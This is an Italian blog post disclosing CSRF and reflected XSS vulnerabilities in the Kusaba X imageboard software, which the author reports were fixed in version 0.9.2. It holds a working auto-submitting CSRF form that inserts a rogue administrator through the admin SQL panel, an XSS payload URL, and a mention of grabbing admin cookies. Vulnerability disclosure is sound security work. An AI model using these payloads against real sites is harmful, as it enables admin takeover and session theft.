---
comments: true
date: 2011-05-12 21:42:09
layout: post.html
slug: kusaba-x-xsscsrf-vulnerabilites
title: Kusaba X CSRF XSS vulnerabilites
wordpress_id: 1031
categories:
- Pentesting
- Security
- Vulnerabilities
- Web Apps
tags:
- /b/
- 4chan
- advisory
- csrf
- hacking
- security
- sql injection
- vulnerability
- xss
---

Ultimamente mi affascina il penetration testing di applicazioni web, scoperto in ritardo visto il mio retaggio primi anni 2000, più dedicato ad *nix, raw sockets e C. Armato di un buon proxy server per il pentest web mi sono dedicato all'auditing di alcune web applications di mia conoscenza.

## Kusaba X e le imageboard

[Kusaba X](http://kusabax.cultnet.net/) è un software per [imageboard](http://it.wikipedia.org/wiki/Imageboard), una sito internet simile alle vecchie bullettin board, ma basato sulla pubblicazione di immagini. Una famosa comunità creatasi da una sezione di una imageboard è /b/ di 4chan, di cui si sente tanto parlare in tanto in tanto per azioni di trolling o per gli attacchi del gruppo Anonymous.
La peculiarità più nota delle imageboard è la completa anonimità degli utenti: i post non sono firmati, nessuno è resposabile delle proprie parole e tutti interloquiscono con un unico nome collettivo. Questa depersonalizzazione le porta ad essere dei microcosmi _anarcheggianti_, davanti ai quali ci si trova spiazzati dal linguaggio incomprensibile, per immagini di cattivo gusto, humor nero, razzismo, trolling, [internet meme](http://en.wikipedia.org/wiki/Internet_meme), e altro. Queste comunità richiamano un internet affascinante di tanti anni fa, senza ancora il recinto messo da facebook ma irc e la magia di non sapere con cui stai interloquendo. Trovo anche nel nome collettivo Anonymous bel un richiamo [blissettiano](http://it.wikipedia.org/wiki/Luther_Blissett_(pseudonimo)), del quale purtroppo si è appropriato il sedicente gruppo "hacker" legato a 4chan.

Finito il discorso da Dams, passiamo alle cose più serie. L'advisory ufficiale è pubblicato nei principali vulnerability [database](http://www.exploit-db.com/exploits/17221/). Ho avvertito gli sviluppatori e i bug sono stati fixati dalla versione 0.9.2.

## Arbitrary SQL statements execution via CSRF

Nelle richieste al pannello di amministrazione non vi è alcun anti csrf token o controllo del referer, quindi è sufficiente che un amministratore loggato visiti la pagina con il CSRF per forzarlo a eseguire comandi privilegiati. ll pannello di amministrazione permette addirittura di inviare comandi SQL con un semplice POST, il che ci rende molto facile fare qualsiasi query al database. Il codice aggiunge un utente privilegiato alla lista degli amministratori, con username 'new_admin' e password 'admin' (salt 'TMC').

~~~ { html }
<html>
<body>
<iframe style="width: 1px; height: 1px; visibility: hidden"
name="hidden"></iframe>
<form method="post" name="sender"
action="http://localhost/kusabax/manage_page.php?action=sql"
target="hidden">
<input type="hidden" name="query"
value="insert into staff values (1331, 'new_admin',
'6a9685fcb53b90f0ca9a1c72d7fa31d2', 'TMC', 1, NULL, 1303904817,
1303908333)">
</form>
</body>
<script>document.sender.submit(); </script>
</html>
~~~

## XSS vulnerability on animation.php

Il file animation.php riflette un parametro passato nella GET senza averlo sanificato

~~~ { php }
<param name="pch_file" value="<?php echo KU_BOARDSPATH . '/' . $_GET['board'] . '/src/' . $_GET['id'] . '.pch'; ?>">
~~~

E il POC è un semplice

~~~ { html }
http://localhost/kusabax/animation.php?board=b&id=1"><script>alert('XSS')</script><"
~~~

ed è ancora più semplice [rubare i cookie](http://en.wikipedia.org/wiki/Cross-site_scripting#Cookie_security) dell'amministratore con un cookie grabber.
